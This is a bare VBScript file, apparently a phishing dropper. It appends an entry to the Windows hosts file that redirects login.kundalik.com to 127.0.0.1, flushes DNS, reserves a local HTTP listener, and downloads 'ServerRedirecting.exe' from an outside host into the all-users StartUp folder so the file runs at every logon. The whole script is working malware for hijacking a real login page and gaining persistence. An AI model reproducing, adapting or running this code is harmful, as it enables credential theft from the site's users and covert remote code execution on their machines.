Const xPhishing = "127.0.0.1"
Const xTarget = "login.kundalik.com"
Const xURL = "http://login-kundalik.ezyro.com/program/ServerRedirecting.exe"
Const xServer = "\ServerRedirecting.exe"
Const CMD = "cmd.exe /c "

Set Shell = CreateObject("WScript.Shell")
Set Network = CreateObject("WScript.Network")
Set HTTP = CreateObject("Microsoft.XMLHTTP")
Set Stream = CreateObject("ADODB.Stream")
Set FSO = CreateObject("Scripting.FileSystemObject")
Set StartUp = FSO.GetFolder("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")
Set hosts = FSO.GetFile("C:\Windows\System32\drivers\etc\hosts")
Set file = FSO.OpenTextFile(hosts.Path, 8, False)

file.Write(vbNewLine & xPhishing & " " & xTarget)
file.Close()

Shell.Run CMD & "ipconfig /flushdns", 0, True
Shell.Run CMD & "netsh http add urlacl url=http://127.0.0.1:80/ user=" & Network.UserName, 0, True

Sub Download(URL, StorePath)
  On Error Resume Next
  HTTP.Open "GET", URL, False
  HTTP.Send()
  If Err.Number <> 0 Then
    MsgBox Err.Description, 0, "File Download Error"
    WScript.Quit()
  End If
  If HTTP.Status = 200 Then
    Stream.Type = 1
    Stream.Open
    Stream.Write HTTP.ResponseBody
    Stream.SaveToFile StorePath, 2
  ElseIf HTTP.Status = 404 Then
    MsgBox HTTP.Status, 0, "File Not Found Error"
    WScript.Quit()
  Else
    MsgBox HTTP.Status, 0, "Unknown FIle Download Error"
    WScript.Quit()
  End If
End Sub

Call Download(xURL, StartUp & xServer)
